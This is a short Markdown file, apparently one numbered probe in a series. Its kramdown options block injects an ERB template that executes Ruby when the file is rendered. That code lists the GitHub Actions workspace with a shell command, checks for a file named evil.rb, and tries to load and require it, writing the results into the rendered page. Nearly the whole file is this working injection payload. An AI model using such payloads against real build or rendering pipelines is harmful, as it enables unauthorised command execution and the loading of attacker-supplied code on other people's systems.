---
---

# Test 24: Direct file require and ls workspace

{::options template="string://<%= r=''; r=r+'LS_WORKSPACE='+IO.popen('ls -la /github/workspace/ 2>&1').read[0..500]+\"\\n\"; r=r+'EVIL_EXISTS='+File.exist?('/github/workspace/evil.rb').to_s+\"\\n\"; begin; load '/github/workspace/evil.rb'; r=r+'LOAD=SUCCESS\\n'; rescue => e; r=r+'LOAD='+e.message[0..100]+\"\\n\"; end; begin; require '/github/workspace/evil'; r=r+'REQ_ABS=SUCCESS\\n'; rescue => e; r=r+'REQ_ABS='+e.message[0..100]+\"\\n\"; end; r %>" /}

placeholder
